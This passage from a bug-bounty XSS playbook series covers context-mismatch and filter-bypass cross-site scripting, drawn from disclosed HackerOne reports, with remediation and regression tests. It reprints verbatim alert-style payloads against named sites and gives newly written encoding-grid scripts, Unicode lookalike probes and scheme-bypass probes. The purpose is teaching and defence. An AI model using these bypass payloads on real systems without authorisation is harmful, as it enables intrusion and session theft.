| **Nothing** | `CONT-126` (`utm_campaign` unescaped) | trivial |
| **Right encoder, wrong context** | `CONT-057` (URL in markup) | CSP partly saved them |
| **Nested/ordered parsers** | `CONT-035` | outer validation invalid after inner parse |
| **CSP blocking** | `CONT-057` (non-IE), `HTML-008` | impact capped |
| **Third-party fetch + render** | `REFL-023` | bytes never touch the target's own templates |
| **Blind, off-origin** | `CONT-155`, `CONT-185` | execution in a system the reporter cannot see |
| **Admin-configured formatting** | `CONT-098` | "self-XSS" only until you test a second admin |

`CONT-098` deserves a specific note. An admin configures *currency formatting* in
`/admin/settings/general`, and the configured string then renders across Pinterest,
Twitter, Buy Button and Facebook sales-channel tabs. That is **stored XSS across two
administrators** — reporter A writes, reporter B (or the same reporter as a different
admin) views. See §4.4 and [`Stored-XSS.md`](../../Stored-XSS.md).

### 8. Impact and Severity Considerations

| Report | Program | H1 severity | Bounty | Note |
| --- | --- | --- | --- | --- |
| `125112` CONT-126 | Uber | not disclosed | $3,000 | marketing subdomain |
| `53098` CONT-057 | Twitter | not disclosed | $1,400 | CSP-limited, IE-only |
| `104359` CONT-098 | Shopify | not disclosed | $1,000 | cross-admin |
| `18691` CONT-035 | Phabricator | not disclosed | $1,000 | any user can write |
| `99245` CONT-095 | Mapbox | not disclosed | $1,000 | third-party pages affected |
| `197337` CONT-185 | Rockstar | medium | $650 | internal domain, blind |
| `158461` CONT-155 | Mapbox | not disclosed | $750 | blind, contact form |
| `209736` DOM-014 | Starbucks | medium (reporter: Critical) | not disclosed | chain asserted, not walked |

**Reading the spread.** The `$650`–`$1,000` cluster is "XSS with no demonstrable
sensitive action." The `$3,000`+ cluster either runs on a high-trust subdomain
(`getrush.uber.com`) or affects every instance of a shared component. Your report
lands where you can justify it — which means you must identify the viewer or the
origin's trust value, every time.

**CSP honesty cuts both ways.** `CONT-057`'s researcher *gained* accuracy by noting CSP
protection elsewhere. Do the same; but do not use CSP to excuse a defect you have
demonstrated — see `REFL-068` in [`Reflected-XSS.md`](../../Reflected-XSS.md) §9, where
Nextcloud fixed the escaping **and** published the CSP as mitigation.

### 9. False Positives and Limitations

- **"Generic" is HackerOne's label, not a technique.** Never report "Generic XSS."
  Name the context.
- **No dead values.** A parameter reflected but escaped everywhere is not a finding.
- **Blind XSS requires an OOB proof.** Asserting it without a callback is a rejected
  report. `CONT-155` and `CONT-185` both have program summaries confirming
  exploitation, which is exactly the evidence you must produce.
- **Chains must be walked.** `DOM-014`'s Critical claim referenced a separate report
  rather than demonstrating the takeover — that is the right way to reference a chain.
- **IE-only is a scope limit, not a dismissal.** `CONT-057` and `HTML-012` reported
  IE-only behaviour honestly. Verify against a current browser; say what you could and
  could not reproduce.
- **Third-party code needs ownership.** An XSS in a partner's widget on the target's
  domain is a *third-party* report unless the partner is in scope. `DOM-016` was
  accepted because the extension was Algolia's own.
- **Deduplicate.** `217745` opened with *"This report is similar in impact,
  exploitability and root-cause as report #205701"* — good practice; the archive
  contains many such follow-ups.

### 10. Remediation and Regression Testing

#### 10.1 Remediation

- **Encode per context at the sink**, for every value, always. Context table in §5.
- **Fix all render paths**, including third-party-facing ones (`CONT-095`).
- **Treat admin-configurable display strings as user input** (`CONT-098`).
- **For widgets that fetch remote content**, validate the response shape and content
  type, and sandbox the render (`REFL-023`).
- **For nested parsers**, parse once, in a fixed order, and validate after the final
  transformation (`CONT-035`).
- **CSP without `unsafe-inline`** as defence in depth.

#### 10.2 Regression tests

| Test | Asserts |
| --- | --- |
| Per-context payload matrix (§6.2) against every reflected parameter | each context encoded correctly |
| Cross-admin test on admin-configurable strings (`CONT-098`) | admin A's value safe when admin B views |
| Third-party widget: attacker-controlled fetch origin rejected | no cross-origin trust |
| Nested-parser regression: input re-parsed after transformation | re-validated after final parse |
| Blind sink: OOB receiver on every form that forwards content internally | blind sinks found and escaped |
| CSP assertion (no `unsafe-inline`) | defence in depth |

### 11. Historical Bug Bounty Case Studies

Sourced facts only. With 196 sources this section highlights a representative sample;
the complete inventory is in
[`references/source-index.md`](../../references/source-index.md), where every one of the 196
has its own row.

---

#### CONT-126 — XSS in getrush.uber.com via marketing parameters

- **Program:** Uber · **Report:** <https://hackerone.com/reports/125112>
- **Archive listing:** <https://h1.security.nathan.sx/uber.html>
- **Weakness:** `XSS - Generic` · **Bounty:** $3,000 · **Severity:** not disclosed
- **Body inspected:** Yes — **full report**.

**Affected feature:** the `utm_campaign` query parameter on `https://getrush.uber.com/business`.

**Payload (as submitted):**
````
https://getrush.uber.com/business?utm_campaign=tttttt%27%3C/script%3E%3Cscript%3Ealert(0)%3C/script%3E&utm_medium=top&utm_source=website
````

**Root cause (reporter, one line):** *"You need to escape the utm_campaign parameter
before rendering it in the HTML."*

**Team summary, verbatim:** *"Reflected XSS in getrush.uber.com due to not escaping
certain tracking parameters."*

**Why it matters here:** the highest-value shape in the whole archive for effort-to-bounty
— a marketing subdomain, a tracking parameter nobody threat-models, and a
one-line root cause.

---

#### CONT-057 — XSS in twitter.com/safety/unsafe_link_warning

- **Program:** Twitter · **Report:** <https://hackerone.com/reports/53098>
- **Archive listing:** <https://h1.security.nathan.sx/twitter.html>
- **Weakness:** `XSS - Generic` · **Bounty:** $1,400 · **Severity:** not disclosed
- **Body inspected:** Yes — **full report**.

**Affected feature:** the `unsafe_link` parameter on the safety interstitial page.

**Reproduction (as submitted):**
````
https://twitter.com/safety/unsafe_link_warning?unsafe_link=https%3A%2F%2Ftwitter.com%2Fsafety%2Funsafe_link_warning%3Funsafe_link%3Dhttp%3A%2F%2Fexample.com%2520onmouseover%3Dalert%281%29%2520style=font-size:100pt%2520
````
Then click "continue" and mouse over it.

**Root cause:** the URL value is placed in markup unquoted, so the trailing
` onmouseover=alert(1) style=…` becomes a real event handler.

**Scope disclosure (reporter):** *"FYI in Firefox and Chrome, it is blocked by CSP :)"* —
and the report states IE-only reproduction.

---

#### CONT-035 — XSS in editor by any user (Phabricator, nested parsing)

- **Program:** Phabricator · **Report:** <https://hackerone.com/reports/18691>
- **Archive listing:** <https://h1.security.nathan.sx/phabricator.html>
- **Weakness:** `XSS - Generic` · **Bounty:** $1,000 · **Severity:** not disclosed
- **Body inspected:** Yes — **full report**.

**Affected feature:** any editor surface where "memes" can be used.

**Payload (as submitted):**
````
{meme, src= http://dummy//onerror=eval(prompt(1))// }
````

**Root cause (reporter):** *"Nested parsing is causing the src value to be treated as a
link which is automatically made link by fabricator. So, a whole mess-up of syntax
happening there. `\\` are being used as space separators since those replaced."*

**Precondition:** any user can write; no privilege required.

**Proposed fix (reporter):** *"May be to avoid nested parsing, it messes up things.
But the choice is yours since you have more knowledge of the application needs."*

---

#### CONT-098 — shopifyapps.com XSS on sales channels via currency formatting

- **Program:** Shopify · **Report:** <https://hackerone.com/reports/104359>
- **Archive listing:** <https://h1.security.nathan.sx/shopify.html>
- **Weakness:** `XSS - Generic` · **Bounty:** $1,000 · **Severity:** not disclosed
- **Body inspected:** Yes — **full report**.

**Affected feature:** currency formatting configured at `*/myshopify.com/admin/settings/general`,
rendered in the Pinterest, Twitter, Buy Button and Facebook sales-channel tabs.

**Reproduction (as submitted):**
1. Remove the pinterest, twitter, buy button and facebook sales channels.
2. Go to `/admin/settings/general` and change currency formatting (see attached
   `currency_formatting.jpg`).
3. Re-add the sales channels at `/admin/channels`.
4. Visit the pinterest, twitter and buy button tabs; then the facebook tab → shop
   (`*/myshopify.com/admin/apps/shopify-facebook/collections`).

**Why it matters here:** the setting is written by one administrator and rendered to
another. That is a **cross-principal** stored XSS and must be tested with two admin
accounts to be credible.

---

#### CONT-155 / CONT-185 — Blind XSS confirmed by the programs

- **CONT-155** `158461` — <https://hackerone.com/reports/158461> — Mapbox, $750.
  Team summary, verbatim: *"@sahilsaif reported a stored blind XSS issue on
  www.mapbox.com/contact. To fix the issue we escaped user provided message content
  before sending to our middleware server."*
- **CONT-185** `197337` — <https://hackerone.com/reports/197337> — Rockstar, medium,
  $650. Team summary, verbatim: *"@anshuman_bh discovered that it is possible to exploit
  a Blind XSS vulnerability under the 'MOUTHOFF TO ROCKSTAR' section while providing
  feedback. The result is a XSS vulnerability being exploited on an internal Rockstar
  Games domain."*

Both bodies withheld; evidence level **partial report**. Both are nonetheless strong
cases because the *programs* confirmed exploitation in their summaries.

---

#### REFL-023 — Reflected XSS via Livefyre Media Wall in newsroom.uber.com

- **Program:** Uber · **Report:** <https://hackerone.com/reports/134061>
- **Archive listing:** <https://h1.security.nathan.sx/uber.html>
- **Weakness:** `XSS - Generic` · **Bounty:** $2,000 · **Severity:** not disclosed
- **Body inspected:** Yes — **full report**.

**Affected feature:** the Livefyre Media Wall embed on `newsroom.uber.com`, sourced
from `cdn.livefyre.com/libs/streamhub-permalink/v0.4.1/streamhub-permalink.min.js`.

**Mechanism (researcher):** the `lf-content` parameter is parsed as
`controlled-domain:GET parameter 'collection_id':GET parameter 'content_id'`, and the
embed fetches
`https://bootstrap.<controlled-domain>/api/v3.0/content/thread/?collection_id=…&content_id=…&depth_only=false`.
The researcher hosted crafted JSON at `https://bootstrap.danylod.com/uber.php`.

**Why it matters here:** third-party code, attacker-controlled fetch origin, and
attacker-controlled response body — rendered in `newsroom.uber.com`'s trust context.

---

#### Supporting context sources (full bodies retrieved)

- **CONT-095** `99245` — <https://hackerone.com/reports/99245> — Mapbox, $1,000. Team
  summary: *"On November 12th, 2015, enderun07 reported a stored cross-site scripting
  (XSS) issue in the share page of a v3 or v4 map hosted on api.mapbox.com. The
  vulnerability also affected version 2.2.3 and 1.6.5 and earlier of mapbox.js…"*
- **DOM-014** `209736` — <https://hackerone.com/reports/209736> — Starbucks, medium.
  Chained-Critical claim with a named second-stage report.
- **HTML-001** `2735` — <https://hackerone.com/reports/2735> — RelateIQ. HTML injected
  into an outbound **invitation email** via the first-name field — a non-browser sink
  with phishing impact. See [`HTML-Injection.md`](../../HTML-Injection.md).
- **HTML-010** `198907` — <https://hackerone.com/reports/198907> — VK.com, low. Filter
  weakness reported **without** claiming XSS. See §9.

### 12. Professional Vulnerability Report Template

`````markdown
# <Context> XSS in <feature> via <parameter>

## Summary
<Input> is reflected/stored into a <HTML text | HTML attribute | JavaScript string |
URL | CSS> context in <origin> without context-appropriate encoding, allowing script
execution in that origin.

## Severity
<rating> — <viewer or origin trust argument>. CSP: <present/absent, and what it blocks>.

## Affected endpoint
`GET|POST https://<host>/<path>?<param>=` · Program: <name> · Date: <YYYY-MM-DD>

## Vulnerability details
### Input → output
````
<parameter>  →  <handler>  →  <exact reflection point in the response>
````

### Output context
<Show the bytes immediately before and after the marker.>

### Root cause
<Which control is missing or mismatched.>

## Proof of concept
### Reflection (inert)
````
https://<host>/<path>?<param>=H1XSSMARKER9
````
> Found at offset <N>, in a <context>.

### Execution
````
https://<host>/<path>?<param>=<context-appropriate payload>
````
> `document.domain` reads `<origin>`.

### Blind variant (if applicable)
> Callback received at `https://COLLAB/?domain=<origin>` at <timestamp>.

### Chain (only if demonstrated)
> Stage 1: XSS in <origin>. Stage 2: <specific action and result, with evidence>.

## Remediation
<Context-appropriate encoding; see §5 and §10.1.>

## Regression tests
<Context-specific probes.>
`````

**Reporting discipline.** Always state the context — that is the finding. Always state
the viewer for blind and stored variants. Disclose CSP. Withhold any chain you have not
walked. State your browser.

### 13. References

- PortSwigger — Cross-site scripting contexts: <https://portswigger.net/web-security/cross-site-scripting>
- OWASP — XSS Prevention Cheat Sheet: <https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html>
- OWASP Web Security Testing Guide — Input Injection: <https://owasp.org/www-project-web-security-testing-guide/>
- Related playbooks: [`Reflected-XSS.md`](../../Reflected-XSS.md),
  [`Stored-XSS.md`](../../Stored-XSS.md), [`DOM-Based-XSS.md`](../../DOM-Based-XSS.md),
  [`Self-XSS.md`](../../Self-XSS.md), [`HTML-Injection.md`](../../HTML-Injection.md)
- Reports cited: <https://hackerone.com/reports/125112>, <https://hackerone.com/reports/53098>,
  <https://hackerone.com/reports/18691>, <https://hackerone.com/reports/104359>,
  <https://hackerone.com/reports/158461>, <https://hackerone.com/reports/197337>,
  <https://hackerone.com/reports/134061>, <https://hackerone.com/reports/99245>,
  <https://hackerone.com/reports/209736>, <https://hackerone.com/reports/198907>

### 14. Research Gaps and Further Investigation

- **Bucket size limits precision.** 196 "Generic" XSS sources span contexts this
  playbook groups as sub-classes in §2. The classification below is inferred from
  titles and report bodies, not from a program-side taxonomy. With more time these
  should be re-sorted into per-context playbooks and the taxonomy re-examined.
- **`CONT-185`'s summary is truncated** — it ends mid-sentence at *"but cannot really…"*.
  The blind-XSS mechanism on the internal Rockstar domain is not fully recoverable.
- **No modern sources.** All evidence predates 2017. Modern sinks
  (`setHTMLUnsafe`, `Element.setHTML`, shadow DOM, Web Components, `srcdoc`) are absent.
- **Untested:** CSP-bypass-assisted severity reassessment for reports capped by CSP;
  mXSS through `innerHTML` round-trips; injection into `srcdoc`/`iframe` attributes.
- **Suggested original research:** systematically re-test the "Generic" bucket's
  contexts to determine how often the true context differs from what the report title
  implied. If it differs often, that is a finding in its own right about how titles
  should be written.



---

<!-- PART 6 of 12 :: Filter-Bypass-and-Encoding.md -->

## Filter Bypass and Encoding XSS

### 1. Overview

This playbook covers the reports where the application *did* attempt to stop XSS and
the attempt was defective. In every case the defence existed, was visible in the
output or the code, and was bypassable.

Three bypass families recur, and they require genuinely different testing methods:

1. **Context mismatch** — an encoder was applied, but not the one the output context
   demands. [`Reflected-XSS.md`](../../Reflected-XSS.md) §2.2.
2. **Encoding-layer mismatch** — double-encoding, or a filter that decodes and
   re-encodes inconsistently between request handling and response rendering.
3. **Filter incompleteness** — a blocklist that misses Unicode lookalikes, null
   bytes, entity tricks, or malformed markup.

All 38 sources in this group were retrieved **with full report bodies** — this is the
best-evidenced playbook in the knowledge base.

### 2. Root Cause and Technical Mechanics

#### 2.1 Context mismatch (encoder ≠ context)

The application calls an encoder; it is simply the wrong one for where the value
lands.

| Case | Context | Failure |
| --- | --- | --- |
| `106293` FILT-017 (`wholesale.shopify.com`) | JS / script context | *"in script context the quotes, double quotes and `>` + `<` are not encoded at all"* |
| `190798` REFL-056 (Teavana) | single-quoted JS string | `'` unescaped |
| `189834` FILT-036 (Informatica) | `<a href='…'>` built from `document.URL` | client-side, no encoding at all |

The Shopify researcher's proposed remediation — *"convert them either to hex values or
escape them"* — is instructive as an **anti-pattern**. Hex-encoding is a
blacklist-shaped answer to an allow-list-shaped problem. Prefer a vetted,
context-specific encoder.

#### 2.2 Double encoding

`REFL-082` (Rockstar Games, `246505`, medium, $500) is the dedicated case; its official
summary states the mechanism plainly: *"This exploit worked by using double-encoding to
bypass our filters."* See [`Reflected-XSS.md`](../../Reflected-XSS.md) §2.3 and note the
limitation recorded there — the body was withheld, so the precise decode sequence is a
testing hypothesis, not a documented fact.

#### 2.3 Filter incompleteness — the richest sub-class here

This is where the archive is most informative, because teams described their own
failures in detail.

**Unicode lookalikes.** Rockstar `STOR-142`: *"we were not filtering **＜** and **＞**
characters the same as `<` and `>`."* Rockstar `STOR-143`: *"certain obscure
characters were not being converted to HTML entities properly"*, with the published
payload `†‡•＜img src=a onerror=javascript:alert('hacked')>…‰€`.

**Regex incompleteness on client-side filters.** Grab `DOM-020`'s `stripHtml` regex
`/<\/?\w+[^>]*\/?>/g` requires a word character after `<`; `<a/` and `<:` slip through.

**Structural incompleteness.** Concret5 `HTML-002` (`6843`): the
`$mp->getProductBlockID()` value in `getMarketplacePurchaseFrame()` was *"not being
filtered properly to protect against HTML injection/XSS"* — reachable at
`dashboard/extend/connect/"%20onmouseover="alert(document.cookie)">`. The reporter
supplied GitHub source links, which is the correct standard of evidence.

**Post-patch regression.** Grab `DOM-020` is explicitly a *bypass of an existing fix*:
*"This vulnerability wasn't properly patched so I managed to bypass the regular
expressioned that was added into the function."*

#### 2.4 The validator/renderer differential

`STOR-144` (Shopify SVG, high, $5,000) belongs here too: a documented element and
attribute allow-list was disabled by an internal DTD `<!ENTITY>`, unmasking `onload`.
The control was well designed; the parser differential defeated it. See
[`Stored-XSS.md`](../../Stored-XSS.md) §7.

### 3. Attack Surface and Preconditions

| Surface | Case |
| --- | --- |
| URL/redirect paths | `REFL-001` (`2497`, Slack `/go/`), FILT-017 |
| UGC comment and profile fields | `STOR-142`, `STOR-143` |
| WordPress admin surfaces | FILT-021/035 (`126539`, `186462`, Shopify) |
| Legacy ASP endpoints | FILT-028 (`143323`, Informatica — `expression(prompt(1))` in an attribute, i.e. IE-only CSS expression) |
| Client-side filters | `DOM-020`, FILT-036 |
| SVG/XML uploads | `STOR-144` |
| Legacy message params | `2777` (Slack `auth.slack.com/generate/`, `u` param) |

**Preconditions:** usually none beyond loading a URL; for stored variants, a write
account. Bypass testing does not change the delivery mechanism — it changes only the
string you send.

### 4. Manual Testing Methodology

1. **Establish the baseline.** Send a plain `<script>alert(1)</script>` and confirm the
   filter fires. Without a working baseline you cannot demonstrate a *bypass*.
2. **Identify the filter's shape** before attacking it:
   - *Blocklist of characters* → test Unicode lookalikes, null bytes, control chars.
   - *Regex strip* → test inputs the regex does not match (unexpected leading char,
     unusual delimiters, nested markup).
   - *Blacklist of substrings* (`onerror=`, `alert`, `javascript:`) → test casing,
     whitespace, entity, and split-token variants.
   - *Allow-list parser* → test parser differentials (DTD/entities, CDATA, namespaces).
   - *One-shot encoder* → test double encoding and re-decoding paths.
3. **Test the encoder against the context**, not against the string. Ask: *given that
   this value lands inside `<a href='…'>`, does this encoder neutralise `'`?*
4. **Systematically vary one dimension at a time** — encoding depth (raw / URL-encoded
   / double-URL-encoded / HTML-entity-encoded), case, whitespace, and character
   repertoire. Record each combination in a table; bypasses hide in the grid.
5. **Test across *every* render site.** `STOR-142` and `STOR-143` are different fields
   with the same class of bug; `STOR-146`/`STOR-147` are sibling widgets with
   inconsistent filtering.
6. **Confirm a real bypass** by re-running the *original* blocked payload — it must
   still be blocked — then showing the variant executes. Otherwise a triager will
   reasonably call it a duplicate of the known filter.
7. **Document the filter's code path** if you can find it. `HTML-002` linked GitHub
   source; that materially shortened its triage.

### 5. Input and Output Context Analysis

Combine this playbook's filter axis with
[`Reflected-XSS.md`](../../Reflected-XSS.md) §5's context table. Filter-bypass questions
that matter most, by observed context:

| Context | Filter present | Bypass that matters |
| --- | --- | --- |
| JS string, single-quoted | HTML-escape only | unescaped `'` |
| `<a href='…'>` | HTML-escape only | `'`, or space+`on…` if unquoted |
| HTML attribute | char blocklist on `<>"'` | `＜` `＞` `＂` (U+FF1C/FF1E/FF02), or `%00` |
| `href` / URL | substring blocklist on `javascript:` | case, `&#106;`, leading control chars, `java\nscript:` |
| `<script>` block | string blocklist | `</script>` termination |
| HTML text | regex strip | non-matching leading char (`<a/`, `<:`) |
| XML/SVG | attribute allow-list | internal DTD entity |
| CSS (legacy IE) | none | `expression()` — see FILT-028 |

FILT-028 (`143323`, Informatica, high) is a distinct legacy case: the payload
`" style="width:expression(prompt(1))` is **CSS `expression()`**, an IE-only
construct. Modern browsers do not execute it. Report it as historical/legacy and
verify current behaviour before claiming impact.

### 6. Test Cases and Proof-of-Concepts

#### 6.1 Historical payloads (verbatim from the cited reports)

Historical. For understanding only — do not replay against live targets.

| Case | Report | Payload as submitted |
| --- | --- | --- |
| FILT-017 | `106293` | `https://wholesale.shopify.com/asd';alert('XSS');'` |
| FILT-002 | `2777` | `u=<img src=x onerror=alert(1)>` |
| FILT-028 | `143323` | `PageLink=" style="width:expression(prompt(1))` |
| STOR-142 | `231389` | fullwidth `＜`/`＞` filter bypass (per team summary) |
| STOR-143 | `231444` | `†‡•＜img src=a onerror=javascript:alert('hacked')>…‰€` |
| DOM-020 | `247246` | `<a/:<"a">img src=# onerror=confirm('XSSED')>` |
| HTML-002 | `6843` | `dashboard/extend/connect/"%20onmouseover="alert(document.cookie)">` |
| STOR-144 | `232174` | `<!DOCTYPE svg [<!ENTITY elem "">]>` + `onload=` |

#### 6.2 Newly authored illustrations (not from the archive)

**Filter-shape test matrix.** Newly authored. Run against targets you are authorised to
test, inert markers first.

````bash
# newly authored — encoding-depth grid for one parameter
BASE='https://TARGET/endpoint?p='
PAYLOAD='"><h1>xss-marker'

for enc in raw url doubleurl htmlentity mixedcase; do
  case $enc in
    raw)        v="$PAYLOAD" ;;
    url)        v=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' "$PAYLOAD") ;;
    doubleurl)  v=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(urllib.parse.quote(sys.argv[1])))' "$PAYLOAD") ;;
    htmlentity) v='&#34;&gt;&lt;h1&gt;xss-marker' ;;
    mixedcase)  v='"><H1>XSS-MARKER' ;;
  esac
  echo "== $enc: ${BASE}${v}"
done
````

**Unicode lookalike probes** (newly authored; the *concept* is sourced from
`STOR-142`/`STOR-143`):

| Probe | Codepoint | Target |
| --- | --- | --- |
| `＜` | U+FF1C FULLWIDTH LESS-THAN | `<` |
| `＞` | U+FF1E FULLWIDTH GREATER-THAN | `>` |
| `＂` | U+FF02 FULLWIDTH QUOTATION MARK | `"` |
| `‹` | U+2039 SINGLE LEFT-POINTING ANGLE QUOTATION MARK | `<` |
| `›` | U+203A | `>` |
| `　` | U+3000 IDEOGRAPHIC SPACE | space |
| `%00` | NUL | terminator |

**Regex non-match probes** (derived from `DOM-020`'s failure): `<a/`, `<:`, `< x`,
`<3`, `</ x`, `<<h1>`.

**Scheme bypass probes** for `href`-style filters: `JaVaScRiPt:`, `java\tscript:`,
`&#106;avascript:`, `\x6aavascript:`, leading `\x01`.

**Escaping the filter — the golden rule.** A bypass report is only credible if you show
*both* halves:

1. `"><script>alert(1)</script>` → **blocked** (baseline)
2. the variant → **executes**

Without part 1, a reviewer cannot tell whether you bypassed a filter or simply found a
field nobody filtered.

### 7. Encoding, Filtering, and Parsing Behavior

Summarised across all 38 sources:

| Filter strategy | Observed failure | Bypass vector |
| --- | --- | --- |
| No filter | — | any payload |
| HTML-escape in non-HTML context | quote unescaped in JS string | `'`, `"` |
| ASCII blocklist on `<` `>` | fullwidth lookalikes reach the parser | `＜` `＞` |
| Partial entity conversion | obscure chars survive | mixed Unicode payload |
| Regex tag-strip | regex fails to match malformed tags | `<a/`, `<:` |
| Substring blocklist | alternate spellings | case, entities, whitespace |
| One-shot encode | decode/re-encode mismatch | double encoding |
| Allow-list parser | parser differential | internal DTD entity |
| Legacy browser feature | `expression()` (IE) | CSS, IE-only |

**The general lesson.** Every filter in this table failed because it operated on a
*different representation* of the payload than the browser's parser did. Blocking is a
statement about strings; execution is a statement about parse trees. Controls should be
built against the parse tree.

### 8. Impact and Severity Considerations

Filter-bypass XSS is rated exactly like the underlying XSS — the filter does not
reduce severity, because a bypassed filter means the protection was absent.

| Report | Program | Severity | Bounty |
| --- | --- | --- | --- |
| `232174` STOR-144 | Shopify | high | $5,000 |
| `189834` FILT-036 | Informatica | high | not disclosed |
| `143323` FILT-028 | Informatica | high | not disclosed |
| `246505` REFL-082 | Rockstar Games | medium | $500 |
| `186462` FILT-035 | Shopify | not disclosed | $500 |
| `126539` FILT-021 | Shopify | not disclosed | $500 |
| `2777` FILT-002 | Slack | not disclosed | $500 |

**Two honest-ceiling examples from this group.** `FILT-028` uses IE-only
`expression()`, and `HTML-010` (`198907`, VK.com) reported a filter weakness where the
researcher explicitly declined to claim XSS. Both constrain severity correctly.

**One inflation example.** `FILT-017`'s researcher proposed converting characters to
hex as a fix; had that been framed as a working mitigation it would have overstated
security. Report the defect, not a fix you have not verified.

### 9. False Positives and Limitations

- **A bypass of a *fix* is a new report; a bypass of a *known issue* is a duplicate.**
  `DOM-020` was accepted because it bypassed a patch; check the archive's "known issues"
  first — `STOR-035`'s researcher did exactly that and said so in the report.
- **Not all odd output is exploitable.** VK's `HTML-010` stored markup that parsed only
  before saving. Report the filter weakness; do not claim XSS you have not shown.
- **Encoding depth must match the server's stack.** Triple-encoding against a framework
  that decodes once is not a finding. Show the response.
- **Legacy payloads need modern verification.** `expression()`, `document.domain`
  quirks, and IE-specific parsing from 2013–2017 sources may no longer execute.
  Re-test and state your browser.
- **Unicode probes need a normalised request path.** Some frameworks normalise input
  before your filter runs, closing the gap. Verify against the live response.

### 10. Remediation and Regression Testing

#### 10.1 Remediation

1. **Delete blocklist filters.** Replace them with context-aware output encoding.
2. **Encode at the sink, for every value, unconditionally**, using a vetted library —
   never hand-rolled, never hex.
3. **Pick the encoder by context** (see
   [`Reflected-XSS.md`](../../Reflected-XSS.md) §10.1). Prefer DOM APIs that make the
   question moot.
4. **Use an allow-list sanitiser** for rich text, configured per context, and keep it
   current.
5. **Validate the validator.** If you allow-list SVG/XML, parse with a hardened parser
   that rejects DTDs, or strip the file to a known-safe subset. Never regex-validate.
6. **Normalise before validating** — decide explicitly whether you filter on NFC,
   NFKC, or raw input, and test the lookalikes that survive your choice.
7. **Constrain input shape** as defence in depth (length, charset, no control chars).
8. **CSP without `unsafe-inline`** as defence in depth.

#### 10.2 Regression tests

Every filter you replace deserves a test that would have caught the original bypass:

| Test | Asserts |
| --- | --- |
| Fullwidth `＜＞＂‹›` in every user-controlled field | ASCII-only filters cannot be reintroduced |
| `%00` and control characters | rejected or stripped |
| Double-URL-encoded payload | decodes to inert text, not markup |
| `<a/`, `<:`, `<<h1>` against any tag-stripping regex | regex matches or is gone |
| `<!DOCTYPE svg [<!ENTITY x "">]>` against any upload filter | DTD rejected |
| `JaVaScRiPt:` / `&#106;avascript:` / `java\tscript:` in URL fields | scheme allow-list holds |
| Baseline `<script>alert(1)</script>` | rejected by input validation, and separately escaped on output |
| Round-trip: input → stored → every render path | output encoding applied on read |

The last row is the one teams most often miss: input validation and output encoding are
different controls, and only the second one fixes XSS.

### 11. Historical Bug Bounty Case Studies

Sourced facts only. All sources in this playbook were retrieved with full bodies.
Inventory: [`references/source-index.md`](../../references/source-index.md).

---

#### FILT-017 — Reflective XSS on wholesale.shopify.com

- **Program:** Shopify · **Report:** <https://hackerone.com/reports/106293>
- **Archive listing:** <https://h1.security.nathan.sx/shopify.html>
- **Published:** 2015-12-21 · **Weakness:** `XSS - Generic` · **Bounty:** $500
- **Severity:** Not disclosed in the source
- **Body inspected:** Yes — **full report**.

**Affected feature:** `https://wholesale.shopify.com/` — reflection of a URL path
segment.

**Reproduction (as submitted):**
````
https://wholesale.shopify.com/asd';alert('XSS');'
````
Tested by the reporter in Mozilla Firefox; an alert box reading `XSS` appeared.

**Root cause, in the researcher's words:** *"The main problem with that XSS is, that
in script context the quotes, double quotes and `>` + `<` are not encoded at all."*

**Impact as claimed:** *"an attacker has full control of the scripts, that are executed
in the victims browser… As the victim trusts the domain wholesale.shopify.com, it will
click the link and could be redirected to a site hosting a browser exploit kit."*

**Proposed remediation (reporter's words):** *"I suggest to convert them either to hex
values or escape them."* Recorded here as historical; see §10.1 for why hex-encoding
is not recommended.

---

#### FILT-002 — Reflected XSS on auth.slack.com/generate/

- **Program:** Slack · **Report:** <https://hackerone.com/reports/2777>
- **Archive listing:** <https://h1.security.nathan.sx/slack.html>
- **Published:** 2014-03-03 · **Weakness:** `XSS - Generic` · **Bounty:** $500
- **Severity:** Not disclosed in the source
- **Body inspected:** Yes — **full report**.

**Affected feature:** the `u` parameter on `https://auth.slack.com/generate/`.

**Reproduction (as submitted):**
1. Submit a username and password on the signup form.
2. On the password-confirmation step, re-enter the password and intercept the request.
3. Modify the `u` parameter to `u=<img src=x onerror=alert(1)>`.
4. Submit — *"the application does not properly escape the special char and hence xss
   got executed."*

**Root cause:** no escaping of the `u` parameter where it is rendered.
**Environment note (reporter):** *"For better reproduction use Firefox."*

**Worth noting:** this is an *authenticated-flow* parameter — the researcher had to
complete a signup before the reflection was reachable. Enumerate parameters in
post-auth flows, not just public ones.

---

#### FILT-028 — XSS on uk.informatica.com

- **Program:** Informatica · **Report:** <https://hackerone.com/reports/143323>
- **Archive listing:** <https://h1.security.nathan.sx/informatica.html>
- **Weakness:** `XSS - Generic` · **Severity:** high · **Bounty:** Not disclosed
- **Body inspected:** Yes — **full report**.

**Affected feature:** `http://uk.informatica.com:80/o/Default.asp`. The reporter named
three vulnerable parameters: **`PageLink`, `ResponseHandlingLanguage`, `UID`**.

**Payload (as submitted):** `PageLink=" style="width:expression(prompt(1))`

**Methodological strength:** the report includes the **complete raw POST request**,
with `Content-Type`, `Cookie`, `Host`, and `User-Agent` headers, so any reviewer could
replay it verbatim.

**Legacy caveat — important.** `expression()` is a **CSS construct implemented only in
Internet Explorer** (through IE's dynamic properties, removed in IE 10 standards mode).
In any current browser this payload produces CSS and nothing more. Treat it as a
historical finding; re-test before claiming impact. This is exactly the kind of
limitation §9 asks you to state.

---

#### STOR-142 / STOR-143 — Rockstar's Unicode filter failures

Covered in full in [`Stored-XSS.md`](../../Stored-XSS.md) §11 with verbatim team summaries.
Re-listed here because they are this playbook's strongest evidence:

- **STOR-142** `231389` — <https://hackerone.com/reports/231389> — medium, $1,000.
  Fullwidth `＜`/`＞` not filtered like ASCII.
- **STOR-143** `231444` — <https://hackerone.com/reports/231444> — medium, $1,000.
  Published payload `†‡•＜img src=a onerror=javascript:alert('hacked')>…‰€`.

Both had their bodies withheld; evidence level **partial report**. Both nonetheless
documented the root cause and (for STOR-143) the exact exploit string — unusually good
disclosure from a program that withheld the body.

---

#### FILT-036 — DOM based XSS in the bindBreadCrumb function

- **Program:** Informatica · **Report:** <https://hackerone.com/reports/189834>
- **Archive listing:** <https://h1.security.nathan.sx/informatica.html>
- **Weakness:** `XSS - Generic` · **Severity:** high
- **Bounty / date:** Not disclosed in the source
- **Body inspected:** Yes — **full report**.

**Affected feature:** the `bindBreadCrumb()` function, invoked on `$(document).ready`
